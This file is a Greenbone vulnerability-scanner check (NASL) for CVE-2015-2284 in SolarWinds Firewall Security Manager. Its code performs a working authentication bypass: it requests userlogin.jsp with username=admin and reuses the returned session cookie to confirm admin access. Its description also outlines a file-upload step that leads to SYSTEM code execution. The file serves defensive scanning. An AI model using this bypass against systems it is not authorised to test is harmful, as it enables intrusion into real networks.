CPE = "cpe:/a:solarwinds:firewall_security_manager";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106014" );
	script_version( "2020-11-12T09:50:32+0000" );
	script_tag( name: "last_modification", value: "2020-11-12 09:50:32 +0000 (Thu, 12 Nov 2020)" );
	script_tag( name: "creation_date", value: "2015-06-30 10:54:34 +0700 (Tue, 30 Jun 2015)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2015-2284" );
	script_name( "Solarwinds FSM Remote Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_solarwinds_fsm_detect.sc" );
	script_mandatory_keys( "solarwinds_fsm/installed" );
	script_tag( name: "summary", value: "Solarwinds Firewall Security Manager is prone to a remote code
execution vulnerability" );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "There are two vulnerabilities in Solarwinds FSM. The first one
is an authentication bypass via the Change Advisor interface due to a user-controlled session.putValue
API in userlogin.jsp, allowing the attacker to set the 'username' attribute before authentication. The
second problem is that the settings-new.jsp file will only check the 'username' attribute before
authorizing the 'uploadFile' action, which can be exploited and allows the attacker to upload a fake
xls host list file to the server, and results in arbitrary code execution under the context of SYSTEM." );
	script_tag( name: "impact", value: "An unauthenticated attacker can obtain upload a fake xls host file
to the server resulting in an arbitrary code execution under the context of SYSTEM." );
	script_tag( name: "affected", value: "Solarwinds FSM 6.6.5 and previous versions." );
	script_tag( name: "solution", value: "Apply the HotFix or upgrade to a later version." );
	script_xref( name: "URL", value: "http://www.zerodayinitiative.com/advisories/ZDI-15-107/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/userlogin.jsp?username=admin";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
useragent = http_get_user_agent();
if(IsMatchRegexp( res, "HTTP/1\\.. 200" ) && IsMatchRegexp( res, "Set-Cookie: JSESSIONID=" ) && IsMatchRegexp( res, "Authentication Not implemented yet" )){
	sessionid = eregmatch( pattern: "JSESSIONID=([0-9a-zA-Z]+);", string: res );
	if(!sessionid[1]){
		exit( 0 );
	}
	url = dir + "/requesthome.jsp";
	req = "GET " + url + " HTTP/1.1\r\n" + "Host: " + http_host_name( port: port ) + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Cookie: " + sessionid[0] + "\r\n\r\n";
	res = http_keepalive_send_recv( port: port, data: req );
	if(IsMatchRegexp( res, "Logged in as: admin" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

